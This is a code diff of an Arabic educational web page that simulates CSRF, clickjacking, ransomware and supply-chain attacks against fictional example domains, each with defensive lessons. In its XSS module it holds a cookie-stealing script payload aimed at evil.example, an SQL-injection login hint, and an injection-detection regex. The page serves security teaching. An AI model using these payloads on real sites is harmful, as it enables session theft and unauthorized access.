-      <b style="color:var(--acc)">لماذا يعيش هذا القانونياً على GitHub؟</b> لأنه لا يحوي أداة هجوم واحدة ولا كود استغلال قابل للاستخدام: كل الأهداف وهمية (نطاقات example ونطاقات التوثيق)، وكل «هجوم» محاكاة رقمية تعرض مفهوماً دفاعياً.
-      أضف ملف <span class="mono" dir="ltr">README.md</span> يشرح هدف المشروع التعليمي و<span class="mono" dir="ltr">LICENSE</span> (MIT مثلاً)، ليكتمل مظهر المستودع الناضج. ولتوسيعه: كل وحدة في الكود معزولة بقسمها الخاص — انسخ قالب أي وحدة، غيّر المحتوى والمنطق، وأضف سطراً للفهرس: هكذا تولد «التشريح 07».
+
+    <div class="panel">
+      <div class="p-head">عبْر السلك — ما وصل البنك لحظة بلحظة <span class="p-tag" dir="ltr">WIRE · LIVE</span></div>
+      <div class="logbox" id="cfFlow">
+        <div class="cap"><span class="ct" dir="ltr">--:--:--</span><span class="chipx c-dim">عبْر السلك — ما يصل بنك المستقبل من كل تبويب تفتحه</span></div>
+      </div>
+      <div class="panel-act"><button class="btn" id="cfReset">إعادة ضبط التجربة</button><span class="hint">بدّل الدفاعات وأعد «فتح» الموقع — النتيجة تتغير جذرياً</span></div>
     </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">الطلب «الصحيح» بلا نيّة</div><div class="f-d">متصفحك يرفق ملف الجلسة مع كل طلب إلى البنك <b>أياً كان من أطلقه</b>؛ والبنك يرى طلباً مكتمل الأركان من هويتك أنت. CSRF ليس اختراقاً — استئجار متصفحك بصفتك أنت.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">لماذا لا ينقذك CORS؟</div><div class="f-d">سياسة الأصل الواحد تحمي <b>قراءة الردود</b> عبر المواقع؛ أما إرسال نموذج POST فيمرّ أصلاً. الحماية الفعلية تُبنى داخل التطبيق نفسه: SameSite + الرموز المضادة.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">قاعدة ذهبية إضافية</div><div class="f-d">لا عملية تغيّر حالة عبر <b>GET أبداً</b>: روابط «اضغط لتأكيد الحذف» باب CSRF مفتوح بلا نموذج أصلاً — فالرابط يُرسل نفسه بمجرد تحميل صورة أو صفحة تحمله.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> الهجوم يستغل أعلى درجات الثقة في الويب — أن كل طلب يحمل ملفاتك صادر منك — فيقلبها سلاحاً: لا يُخترق البنك ولا يُلمس جهازك. دفاعان متكاملان ينهيانه: SameSite يمنع الملف من عبور المواقع، والرمز يفرض سرّاً لا يعرفه الغريب — وبينهما يختفي الهجوم كلياً.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ 08 · اختطاف النقرة ============ -->
+  <section class="module" id="mod-cj" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 08 / 10</span></div>
+    <h2 class="mod-title">اختطاف النقرة <span class="en" dir="ltr">CLICKJACKING</span></h2>
+    <p class="mod-lead">صفحة الجائزة فوقك، وواجهة البنك <b>شفافة تحتها</b> — وزرا «استلم الجائزة» و«وافق على التحويل» في نفس البقعة بالضبط. فعّل «أشعة X» لترى الحيلة بعينك، ثم انقر وجرّب الحماية التي تُطفئ الهجوم من جذره.</p>
+
+    <div class="panel">
+      <div class="p-head">مسرح «الجائزة الكبرى» — صفحتان في موضع واحد <span class="p-tag" dir="ltr">LIVE</span></div>
+      <div class="cj-stage" id="cjStage">
+        <div class="cj-bank">
+          <div class="cj-bank-inner">
+            <div class="cj-bank-head">bank.example / transfer / approve</div>
+            <div class="cj-bank-row">المستلم: <span class="mono" dir="ltr">m0ther.example</span></div>
+            <div class="cj-bank-row">المبلغ: <span class="mono" dir="ltr">800</span> — بانتظار موافقتك</div>
+          </div>
+          <button class="cj-bank-btn" id="cjBankBtn" type="button" tabindex="-1">وافق على التحويل</button>
+          <div class="cj-xonly cj-lab-bot">‹ ما يستقبل النقرة فعلاً — زر البنك تحت زر الجائزة تماماً</div>
+        </div>
+        <div class="cj-refuse">
+          <div style="text-align:center">
+            <div class="mono" style="color:#E8767A;font-size:13px" dir="ltr">X-Frame-Options: DENY</div>
+            <div style="font-size:12px;color:var(--mut);margin-top:8px;line-height:1.8">رفض البنك تضمين واجهته في أي إطار خارجي —<br>لا صفحة بنك هنا أصلاً</div>
+          </div>
+        </div>
+        <div class="cj-lure">
+          <b>مبروك! أنت الزائر رقم 1,000,000</b>
+          <div class="cf-sub">اضغط فوراً لاستلام جائزتك قبل انتهاء العدّاد</div>
+          <button class="cj-lure-btn" id="cjLureBtn" type="button">استلم الجائزة الآن</button>
+        </div>
+        <div class="cj-xonly cj-lab-top">‹ ما يراه الضحية — صفحة الجائزة (طبقة عليا مصمتة)</div>
+      </div>
+      <div class="m-ctrl">
+        <div class="grp"><span class="lab">أشعة X — اكشف الطبقتين</span><div class="sw" id="cjXraySw"><i></i></div></div>
+        <div class="grp"><span class="lab">حماية التأطير على البنك</span><div class="sw" id="cjFrameSw"><i></i></div></div>
+        <button class="btn" id="cjReset">إعادة ضبط</button>
+        <span class="hint">سُرح دون وعي: <b class="mono" id="cjMoney" dir="ltr">0</b></span>
+        <span class="hint" id="cjStatus" style="flex:1;min-width:220px">انقر زر الجائزة مباشرة لتعيش التجربة كضحية — أو فعّل «أشعة X» أولاً لترى الخدعة.</span>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">«إعادة تجميل الواجهة» — لا اختراق</div><div class="f-d">الضحية يرى صفحة وينقر زرها الظاهر، بينما النقرة تهبط على عنصر في صفحة أخرى مُطارَة <b>شفافة فوقه</b> — بصلاحيات جلسته هو. لا كلمة مرور تُسرق ولا ثغرة تُستغل: نقرة في اللحظة الخطأ فقط.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">العلاج على الخادم، لا عند المستخدم</div><div class="f-d"><b>X-Frame-Options</b> أو <b>CSP frame-ancestors</b> يمنعان تأطير موقعك الحساس من الأساس — لأنه لا يمكن للمستخدم تمييز شفافية بطبقتين بالعين المجردة، مهما بلغ يقظه.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">أنواعه الشائعة</div><div class="f-d">«لايك-جاكينغ» فوق أزرار المتابعة · أزرار تشغيل مزيفة فوق تفويضات الحسابات · «مؤشرات» وهمية فوق أزرار الشراء — وكل ما يحتاج نقرة موثوقة قابل للاختطاف بنفس الحيلة.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> المهاجم لا يحتاج كلمة مرورك ولا ثغرة في البنك — يحتاج نقرة واحدة منك في اللحظة الخطأ. وخط الدفاع ليس وعيك (لا عين تميّز الشفافية) بل خيار واحد في إعدادات الخادم: أن يرفض موقعك الحساس الانصهار في أي إطار خارجي — كما جرّبتَ في المسرح أعلاه.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ 09 · الفدية ============ -->
+  <section class="module" id="mod-rw" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 09 / 10</span></div>
+    <h2 class="mod-title">برنامج الفدية <span class="en" dir="ltr">RANSOMWARE</span></h2>
+    <p class="mod-lead">مرفق واحد، وقرصك كله يتحول إلى <b>هراء مشفَّر</b> أمام عينيك — مع عدّاد فدية يعدّ تنازلياً. القرار بعدها لك: تدفع (مقامرة مع مجرم)، أو ترفض (خسارة مؤكدة)… أو تضغط الزر الذي يفقد المهاجم كل قوته من أساسه.</p>
+
+    <div class="duo">
+      <div class="panel">
+        <div class="p-head">مستنداتك — قرصك الشخصي (وهمي)
+          <span class="p-tag" dir="ltr">FILES</span>
+          <div class="grp" style="display:flex;align-items:center;gap:8px;margin-inline-start:12px">
+            <span class="hint">نسخة احتياطية خارج الشبكة</span>
+            <div class="sw on" id="rwBkSw"><i></i></div>
+          </div>
+        </div>
+        <div class="rw-grid" id="rwGrid"></div>
+        <div class="panel-act">
+          <button class="btn red" id="rwInfect">افتح المرفق: فاتورة_مستحقة.exe</button>
+          <button class="btn" id="rwReset">إعادة ضبط</button>
+          <span class="hint">محاكاة كاملة داخل المتصفح — لا شيء يلمس جهازك الحقيقي</span>
+        </div>
+      </div>
+      <div class="panel">
+        <div class="p-head"><span class="dot"></span>ما يظهر لك بعد العدوى <span class="p-tag" dir="ltr">RANSOM NOTE</span></div>
+        <div class="rw-note" id="rwNote" hidden>
+          <h4>كل ملفاتك مشفّرة — AES-256</h4>
+          <div class="rw-nt">المفتاح عندنا فقط، ولا فك تشفير إلا بدفع: <b style="color:var(--red)">500$</b> بعملة رقمية خلال:</div>
+          <div class="rw-timer" id="rwTimer" dir="ltr">48:00:00</div>
+          <div class="rw-actions">
+            <button class="btn red" id="rwPay">ادفع الفدية — مقامرة</button>
+            <button class="btn" id="rwRefuse">ارفض الدفع — خسارة مؤكدة</button>
+            <button class="btn-grn" id="rwRestore">استعادة من النسخة الاحتياطية</button>
+          </div>
+          <div class="hint" id="rwBkHint" style="margin-top:10px">نسختك خارج الشبكة لم تُلَس أصلاً — خيار الاستعادة موجود بسببها وحدها</div>
+        </div>
+        <div id="rwEmpty" class="cbody"><div class="hint" style="font-size:12px;line-height:1.9">لا ملاحظة فدية بعد — القرص سليم، وكل هذا الجانب فارغ عمداً. اضغط المرفق في اليمين وسيكتمل خلال ثوانٍ… مع 12 ملفاً من عمرك بين النقرتين.</div></div>
+        <div class="logbox" id="rwLog">
+          <div class="cap"><span class="ct" dir="ltr">--:--:--</span><span class="chipx c-dim">قرصك سليم — مرفق واحد يفصلك عن كابوس كامل</span></div>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">تشفير حقيقي بسلاح شرعي</div><div class="f-d"><b>AES-256</b> نفسه الذي يحمي أسرارك: لا «كسر» رياضياً ولا عبقرية في القصة — كل شيء أن المفتاح بيد من طلب المال. لهذا لا توجد أداة سحرية تفكّ ما شفاه.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">الابتزاز المزدوج</div><div class="f-d">يسرقون <b>نسخة من بياناتك قبل تشفيرها</b>: فالدفع يشتري مفتاحاً «محتملاً» لا صمتاً مضموناً — والتهديد بالنشر بندٌ ثابت في العقد الخفي مع مجرم لا يُلزمه أحد.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">العلاج الوحيد الموثوق</div><div class="f-d">نسخ <b>3-2-1</b>: ثلاث نسخ، وسيطان مختلفان، وواحدة <b>خارج الشبكة</b> لا يستطيع المهاجم لمسها — مع تحديثات منتظمة وحذر من المرفقات التنفيذية. كل ما عدا ذلك تفاوض مع مجرم.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> معركة الفدية تُحسم قبل أول تشفير: من يملك نسخة بعيدة عن متناول المهاجم يملك الموقف كله — والفدية تفقد قيمتها قبل أن تُطلب. أما الدفع فيانصيب بلا شرف: بعض الفائزين مؤقتاً، والخاسرون يمولون الهجمة القادمة على غيرهم.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
+  </section>
+
+  <!-- ============ 10 · سلسلة التوريد ============ -->
+  <section class="module" id="mod-sc" hidden>
+    <div class="mod-top"><button class="back">‹ عودة للفهرس</button><span class="mod-no" dir="ltr">ANATOMY 10 / 10</span></div>
+    <h2 class="mod-title">سلسلة التوريد <span class="en" dir="ltr">SUPPLY CHAIN</span></h2>
+    <p class="mod-lead">أعقد سيناريو اختراق: لا أحد يهاجمك أنت — يُهاجم <b>من تستأمن على برمجياتك</b>. شيفرة خبيثة تدخل خادم البناء، تُوقَّع باسم الشركة نفسها، وتصل آلاف العملاء «تحديثاً موثوقاً» لا يراجعه أحد. ثم شغّل التحقق القابل للإعادة وشاهد المؤامرة تُكشف عند البوابة.</p>
+
+    <div class="panel">
+      <div class="p-head">خط الإمداد — من شيفرة المطوّر إلى 24,000 عميل <span class="p-tag" dir="ltr">PIPELINE · LIVE</span></div>
+      <svg id="scSvg" class="stage" viewBox="0 0 1000 330">
+        <line x1="850" y1="110" x2="646" y2="110" class="wire"/>
+        <line x1="594" y1="110" x2="454" y2="110" class="wire"/>
+        <line x1="406" y1="110" x2="350" y2="110" class="wire"/>
+        <g transform="translate(880,110)">
+          <rect x="-30" y="-36" width="60" height="42" rx="3" class="node"/>
+          <rect x="-23" y="-29" width="46" height="28" fill="none" class="ndet"/>
+          <line x1="0" y1="6" x2="0" y2="13" class="ndet"/>
+          <line x1="-13" y1="15" x2="13" y2="15" class="ndet"/>
+          <text x="0" y="40" class="nlab" text-anchor="middle">المطوّر</text>
+          <text x="0" y="56" class="nsub" text-anchor="middle">شيفرة نظيفة — مراجَعة</text>
+        </g>
+        <g id="scBuild" transform="translate(620,110)">
+          <rect x="-26" y="-46" width="52" height="92" rx="4" class="node"/>
+          <rect x="-18" y="-36" width="36" height="20" fill="none" class="ndet"/>
+          <rect x="-18" y="-10" width="36" height="20" fill="none" class="ndet"/>
+          <rect x="-18" y="16" width="36" height="20" fill="none" class="ndet"/>
+          <circle cx="10" cy="-26" r="2.5" class="sled"/>
+          <circle cx="10" cy="0" r="2.5" class="sled"/>
+          <circle cx="10" cy="26" r="2.5" class="sled"/>
+          <text x="0" y="66" class="nlab" text-anchor="middle">خادم البناء والتوقيع</text>
+          <text x="0" y="82" class="nsub" text-anchor="middle">يجمع، يفحص، يوقّع — ثم يوزّع</text>
+        </g>
+        <g id="scGate" transform="translate(430,110)">
+          <path d="M0 -32 L26 -23 V4 Q26 22 0 32 Q-26 22 -26 4 V-23 Z" class="node"/>
+          <path d="M-10 2 L-3 10 L12 -8" fill="none" style="stroke:var(--acc)" stroke-width="2"/>
+          <text x="0" y="52" class="nlab" text-anchor="middle">بوابة تحقق العميل</text>
+          <text x="0" y="68" class="nsub" text-anchor="middle">توقيع + مطابقة إعادة الإنتاج</text>
+        </g>
+        <g transform="translate(195,110)">
+          <rect x="-155" y="-78" width="310" height="156" rx="5" class="node"/>
+          <text x="0" y="-58" class="nlab" text-anchor="middle">عملاء المنظمة</text>
+          <g id="scSquares"></g>
+          <text x="0" y="100" class="nsub" text-anchor="middle">كل مربع ≈ 1,000 منظمة — تحديثات تلقائية</text>
+        </g>
+        <g id="scPkts"></g>
+      </svg>
+      <div class="m-ctrl">
+        <span class="sc-count" id="scCount" dir="ltr">0 / 24,000</span>
+        <div class="grp"><span class="lab">تحقق عند التثبيت</span><div class="sw" id="scVerSw"><i></i></div></div>
+        <button class="btn red" id="scAttack">زرع شيفرة خبيثة في خادم البناء</button>
+        <button class="btn" id="scReset">إعادة ضبط</button>
+      </div>
+      <div class="logbox" id="scLog" style="border-top:1px solid var(--line)">
+        <div class="cap"><span class="ct" dir="ltr">--:--:--</span><span class="chipx c-dim">الخط نظيف — اضغط «زرع» لمشاهدة كيف تسقط الثقة سلسلةً كاملة</span></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">الباب الأرخص: سجل الحزم العامة — أي واحدة تثبّت؟ <span class="p-tag" dir="ltr">TYPOSQUAT</span></div>
+      <div class="cbody">
+        <div class="seg c3" id="scPkgs">
+          <button data-p="ok"><b dir="ltr">requests</b><i>الحزمة الشهيرة — كما تعرفها</i></button>
+          <button data-p="typo"><b dir="ltr">reqeusts</b><i>شبيهتها… لاحِق جيداً</i></button>
+          <button data-p="squat"><b dir="ltr">requests-dev</b><i>ملحق «تطوير»؟</i></button>
+        </div>
+        <div id="scPkgRes"></div>
+      </div>
+    </div>
+
+    <div class="panel">
+      <div class="p-head">حدود الدرس</div>
+      <div class="facts">
+        <div class="fact"><div class="f-no" dir="ltr">01</div><div class="f-t">يدخل من الباب الأمامي موقّعاً</div><div class="f-d">لا شهادة مسروقة ولا ثغرة عند العملاء: المهاجم يستقر في <b>«مصنع الثقة» نفسه</b>، فيصل السم بتوقيع الشركة الأصلي — كما حدث في SolarWinds حين وصل باب خلفي لنحو 18,000 منظمة عبر تحديث رسمي واحد.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">02</div><div class="f-t">التوقيع وحده لا يكفي</div><div class="f-d">إن وقّع خادم البناء المخترق التحديثَ نفسه، فستصدّق كل البوابات على السم. الحل: <b>بناء قابل لإعادة الإنتاج</b> — العميل يعيد التجميع من المصدر ويقارن بايت-ببايت؛ أي انحراف مؤامرة مكشوفة مهما صحّ التوقيع.</div></div>
+        <div class="fact"><div class="f-no" dir="ltr">03</div><div class="f-t">الأبواب الأرخص مفتوحة دوماً</div><div class="f-d"><b>Typosquatting</b> وإرباك التبعيات في السجلات العامة: قبل كل تثبيت افحص الناشر وعمر الحزمة والتحميلات ووجود مستودع شيفرة — دقائق تفصل مكتبة حقيقية عن باب خلفي.</div></div>
+      </div>
+      <p class="verdict"><b>الخلاصة:</b> في سلسلة التوريد تُهزم الثقة لا التقنية: لم يُخترق عميل ولم تُسرق شهادة — اخترق مكانٌ واحد يصنع ما يثق به الجميع. لهذا يتحقق العميل بنفسه (إعادة إنتاج + توقيع) بدل أن يصدّق، ويُغلق المزوّدون خطوط بنائهم — لأن نقطة فشل واحدة في السلسلة تصبح نقطة فشل للجميع.</p>
+    </div>
+    <div class="mod-end"><button class="back">‹ عودة للفهرس</button></div>
   </section>
 
   <footer>
@@ -905,7 +1245,11 @@ const HINTS={
   'mod-sqli':'اكتب في حقل المستخدم: admin\' --  ثم اضغط دخول — وراقب سطر الاستعلام يتشوه حرفاً حرفاً.',
   'mod-xss':'اضغط «جرّب حقنة جاهزة» ثم انشر — وبعدها فعّل مفتاح التصريف في الأعلى وأعد المحاولة.',
   'mod-brute':'اكتب كلمة مرور تجريبية في الحاسبة (كل شيء محلي) — أو ابدأ هجوم الرقم السري مباشرة.',
-  'mod-mitm':'أرسل حوالة بلا TLS أولاً وشاهد ما تلتقطه العين — ثم فعّله وواجه قرار الشهادة المزوّرة.'
+  'mod-mitm':'أرسل حوالة بلا TLS أولاً وشاهد ما تلتقطه العين — ثم فعّله وواجه قرار الشهادة المزوّرة.',
+  'mod-csrf':'اضغط «افتح الموقع في تبويب جديد» — أنت مسجّل في البنك في التبويب الآخر. ثم فعّل SameSite وأعد الزيارة.',
+  'mod-cj':'فعّل «أشعة X» أولاً لترى ما تحت زر الجائزة — ثم أطفئه وانقر، وقارن مع حماية التأطير.',
+  'mod-rw':'اضغط «افتح المرفق» وراقب ملفاتك تُشفَّر واحداً واحداً — النسخة الاحتياطية مفعّلة: جرّب أيضاً إطفاءها.',
+  'mod-sc':'اضغط «زرع في خادم البناء» وراقب التحديث «الموقّع» ينتشر — ثم فعّل التحقق وأعد الهجوم.'
 };
 const HINTED={};
 function openMod(id){
@@ -923,7 +1267,6 @@ function openMod(id){
   r.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();go();}});
 });
  $$('.back').forEach(b=>b.addEventListener('click',()=>openMod(null)));
-/* شرطات الخطورة في الفهرس */
  $$('.cat-sev').forEach(s=>{
   const n=+s.dataset.s;
   for(let i=0;i<5;i++){const d=document.createElement('span');if(i<n)d.className='f'+(n>=5?' hot':'');s.appendChild(d);}
@@ -956,7 +1299,6 @@ function openMod(id){
     if(d.cdn){mbps*=.35;syn*=.02;rps*=.6;}
     return{mbps,syn,rps};
   }
-  /* عناصر المسرح */
   const tg=$('#dTicks');
   for(let x=120;x<=1100;x+=50){const l=document.createElementNS(ns,'line');l.setAttribute('x1',x);l.setAttribute('x2',x);l.setAttribute('y1',272);l.setAttribute('y2',280);l.setAttribute('class','tick');tg.appendChild(l);}
   const BOTS=[[955,68],[1015,58],[1075,70],[1130,80],[978,104],[1038,100],[1098,112],[1148,106],[1000,138],[1120,142]];
@@ -1018,7 +1360,6 @@ function openMod(id){
     row.innerHTML=h;log.prepend(row);
     while(log.children.length>7)log.lastChild.remove();
   }
-  /* نبض المحاكاة */
   const CV={};
   function setupAvail(){
     const cv=$('#dAvailC'),r=cv.getBoundingClientRect();if(r.width<2)return;
@@ -1132,7 +1473,6 @@ function openMod(id){
       :[['STOP','c-acc'],['أُوقف الهجوم — الخادم يلتقط أنفاسه والجدول يفرغ خلال ثوانٍ','c-acc']]);
     updatePower();updateHUD();
   });
-  /* الدفاعات */
   const DEFS=[
     {id:'rl',code:'RATE-LIMIT',name:'قصّ لكل عنوان IP',desc:'أي مصدر يتجاوز حداً يُقصّ عند الحافة. قاتل ضد جهاز واحد — أعمى أمام جيش كلٌّ منه «تحت الحد».',on:'قصّ فوري لأي مصدر فوق الحد',off:'كل مصدر يمرّ بحرية',lgOn:['RATE-LIMIT','أي مصدر فوق 25 Mbps / 8 rps يُقصّ فوراً'],lgOff:['RATE-LIMIT','أُطفئ — الباب مفتوح لكل مصدر']},
     {id:'ck',code:'SYN COOKIE',name:'كعكات SYN',desc:'لا حجز ذاكرة قبل إكمال المصافحة — الحالة تُرمَّز داخل رقم التسلسل نفسه. حل أنيق لهجوم واحد بالضبط.',on:'هجوم SYN يسقط أثره إلى الصفر',off:'كل SYN يحجز فتحة انتظاراً لـ ACK لن يأتي',lgOn:['SYN COOKIE','الحالة في رقم التسلسل — بلا حجز ذاكرة'],lgOff:['SYN COOKIE','أُطفئ — عاد حجز الفتحات لكل SYN']},
@@ -1172,7 +1512,6 @@ function openMod(id){
     ['syn','http','udp','amp'].forEach(v=>{const[k,tip]=MTX[d.id][v];r+=`<span class="badge b-${k}" title="${tip}"></span>`;});
     mtx.innerHTML+=r;
   });
-  /* سجل دوري */
   let lc=0;
   setInterval(()=>{
     lc++;
@@ -1198,7 +1537,7 @@ function openMod(id){
 (function(){
   const P=new Set();
   const list=$('#pList'),count=$('#pCount');
-  function addFound(k,t,ex,dim){
+  function addFound(t,ex,dim){
     const li=document.createElement('li');if(dim)li.className='dim';
     li.innerHTML=`<b>${t}</b><span>${ex}</span>`;list.appendChild(li);
     count.innerHTML=P.size+' <small>/ 6 مؤشرات</small>';
@@ -1209,14 +1548,14 @@ function openMod(id){
     P.add(k);el.classList.add('hit');
     const m=document.createElement('span');m.className='fmark';el.appendChild(m);
     if(k==='link')$('#pLinkHint').classList.add('show');
-    addFound(k,el.dataset.t,el.dataset.ex);
+    addFound(el.dataset.t,el.dataset.ex);
   }));
   $('#pReveal').addEventListener('click',()=>{
     $$('.p-flag').forEach(el=>{
       const k=el.dataset.k;if(P.has(k))return;
       P.add(k);el.classList.add('hit','dim');
       if(k==='link')$('#pLinkHint').classList.add('show');
-      addFound(k,el.dataset.t,el.dataset.ex,true);
+      addFound(el.dataset.t,el.dataset.ex,true);
     });
   });
 })();
@@ -1251,7 +1590,7 @@ function openMod(id){
     clearRows();
     if(SQ.def){
       const m=USERS.find(x=>x.u===u&&x.p===p);
-      if(m){$( `#sqTable tr[data-u="${m.u}"]`).classList.add('hit');showRes('ok','دخول مشروع — '+m.u,'المطابقة تمت على قيمتين حرفيتين. جرّبتَ الحقن أعلاه؟ صار مجرد نص يُقارَن حرفاً بحرف — ولا يشبه شيئاً.');}
+      if(m){$(`#sqTable tr[data-u="${m.u}"]`).classList.add('hit');showRes('ok','دخول مشروع — '+m.u,'المطابقة تمت على قيمتين حرفيتين. جرّبتَ الحقن أعلاه؟ صار مجرد نص يُقارَن حرفاً بحرف — ولا يشبه شيئاً.');}
       else showRes('bad','رفض الدخول','المُعاملات حُمِّلت كنص خام: محاولة الحقن صارت سلسلة بلا معنى تُقارَن ولا تُنفَّذ. هذا هو العلاج البنيوي لا الترقيع.');
     }else if(isByp(t)){
       if(isOr(t)){$$('#sqTable tr').forEach(r=>r.classList.add('hit'));showRes('bad','دخول بلا كلمة مرور — كل الصفوف!','شرط OR جعل «أين user=نص AND pass=نص» صحيحاً لكل صف، فأعاد الاستعلام الجدول كاملاً — وعدّ الأول admin.');}
@@ -1281,7 +1620,7 @@ function openMod(id){
   const PAYLOAD='<sc'+'ript>location="//evil.example/?c="+document.cookie</scr'+'ipt>';
   const isMal=v=>/<\s*\/?\s*(script|img|svg|iframe)|on\w+\s*=|javascript:/i.test(v);
   const list=$('#xList');
-  const seed=[{who:'ليلى',txt:'وصلني الطلب، شكراً على السرعة!'},{who:'خالد',txt:'التوصيل كان أسرع من المتوقع 👍'.replace(' 👍','')}];
+  const seed=[{who:'ليلى',txt:'وصلني الطلب، شكراً على السرعة!'},{who:'خالد',txt:'التوصيل كان أسرع من المتوقع — شكراً!'}];
   function render(){
     list.innerHTML='';
     seed.forEach(c=>{
@@ -1334,7 +1673,6 @@ function openMod(id){
 
 /* ============ 05 · التخمين ============ */
 (function(){
-  /* الحاسبة */
   const pw=$('#bPw');
   const fmtT=sec=>{
     if(sec<1)return'لحظة';
@@ -1361,7 +1699,6 @@ function openMod(id){
     });
   }
   pw.addEventListener('input',calc);
-  /* مختبر PIN */
   const B={pin:'',guess:-1,tries:0,locked:false,lockLeft:0,running:false,def:true,found:false,elap:0};
   const newPin=()=>String(Math.floor(Math.random()*10000)).padStart(4,'0');
   B.pin=newPin();
@@ -1456,7 +1793,7 @@ function openMod(id){
   function state(){
     const el=$('#mState');
     if(M.ignored)el.innerHTML='<span style="color:#E8767A">TLS + شهادة مزوّورة مقبولة — التشفير شكلي من الآن: المهاجم يفكّ ويُعيد التشفير بينك وبين كل جهة.</span>';
-    else if(M.tls)el.innerHTML='TLS جاهز — عند أول إرسال سيحاول المهاجم شهادة مزوّرة، و<b style="color:var(--acc)">قرارك</b> يحدد كل ما بعده.';
+    else if(M.tls)el.innerHTML='TLS جاهز — عند أول إرسال سيحاول المهاجم شهادة مزوّورة، و<b style="color:var(--acc)">قرارك</b> يحدد كل ما بعده.';
     else el.innerHTML='بلا TLS — كل ما ترسله نصٌّ صريح يمرّ أمام العين مباشرة.';
   }
   async function send(){
@@ -1518,9 +1855,357 @@ function openMod(id){
     $('#mWarn').classList.remove('show');
     $('#mLog').innerHTML='<div class="cap"><span class="ct" dir="ltr">--:--:--</span><span class="chipx c-dim">لا التقاطات بعد — أرسل حوالة</span></div>';
     state();know();
-    toast('جلسة جديدة — إن كان TLS مفعلاً سيحاول المهاجم شهادة مزوّرة من جديد عند أول إرسال.');
+    toast('جلسة جديدة — إن كان TLS مفعلاً سيحاول المهاجم شهادة مزوّورة من جديد عند أول إرسال.');
   });
   state();know();
+})();
+
+/* ============ 07 · تزوير الطلب ============ */
+(function(){
+  const C={bal:12400,ss:false,tok:false,busy:false};
+  const flow=$('#cfFlow');
+  function row(chips){
+    const r=document.createElement('div');r.className='cap';
+    let h=`<span class="ct" dir="ltr">${nowT()}</span>`;
+    chips.forEach(([t,c])=>h+=`<span class="chipx ${c}" dir="auto">${t}</span>`);
+    r.innerHTML=h;flow.prepend(r);
+    while(flow.children.length>8)flow.lastChild.remove();
+  }
+  function trRow(chips){
+    const box=$('#cfTr');
+    const r=document.createElement('div');r.className='cap';
+    let h=`<span class="ct" dir="ltr">${nowT()}</span>`;
+    chips.forEach(([t,c])=>h+=`<span class="chipx ${c}" dir="auto">${t}</span>`);
+    r.innerHTML=h;box.prepend(r);
+    while(box.children.length>6)box.lastChild.remove();
+  }
+  function updBal(){
+    const el=$('#cfBal');
+    el.textContent=C.bal.toLocaleString('en-US');
+    el.classList.toggle('hit',C.bal<12400);
+  }
+  function wireDef(rowEl,swId,key){
+    const sw=document.getElementById(swId);
+    const go=()=>{C[key]=!C[key];sw.classList.toggle('on',C[key]);rowEl.classList.toggle('on',C[key]);rowEl.setAttribute('aria-checked',C[key]);};
+    rowEl.addEventListener('click',go);
+    rowEl.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();go();}});
+  }
+  wireDef($('#cfSsRow'),'cfSsSw','ss');
+  wireDef($('#cfTokRow'),'cfTokSw','tok');
+  $('#cfSrcSw').addEventListener('click',()=>{
+    const sw=$('#cfSrcSw');
+    sw.classList.toggle('on');
+    $('#cfSrc').hidden=!sw.classList.contains('on');
+  });
+  $('#cfVisit').addEventListener('click',()=>{
+    if(C.busy)return;C.busy=true;
+    row([['TAB','c-dim'],['فتح cats.example في تبويب جديد — وبنك المستقبل ما زال بجلستك في الآخر','c-dim']]);
+    setTimeout(()=>row([['AUTO-SUBMIT','c-red'],['النموذج الخفي أرسل نفسه فور التحميل — لم تنقر شيئاً أصلاً','c-red']]),600);
+    setTimeout(()=>row([['POST /transfer','c-red'],['to: m0ther.example · amt: 5,000 · origin: cats.example','c-red']]),1200);
+    setTimeout(()=>{
+      if(C.ss)row([['COOKIE','c-acc'],['لم تُرسَل — SameSite=Strict منع ملف جلستك من عبور المواقع، فطار الطلب بلا هوية','c-acc']]);
+      else row([['COOKIE','c-red'],['SESSION=8f3a9c… أُرفقت تلقائياً — سلوك المتصفح الافتراضي، لا قرار منك','c-red']]);
+    },1700);
+    setTimeout(()=>{
+      if(!C.ss&&!C.tok){
+        if(C.bal<=0){
+          row([['200','c-red'],['الحساب فارغ أصلاً — نهبٌ سابق أتمّ المهمة','c-red']]);
+        }else{
+          const amt=Math.min(5000,C.bal);
+          C.bal-=amt;updBal();
+          row([['200 OK','c-red'],['حُوِّلت '+fmtN(amt)+' إلى m0ther.example — كل شيء «صحيح»: جلستك، متصفحك، عنوانك… إلا النيّة','c-red']]);
+          trRow([['حوالة صادرة','c-red'],[fmtN(amt)+' → m0ther.example — لم تصنعها بيدك','c-red']]);
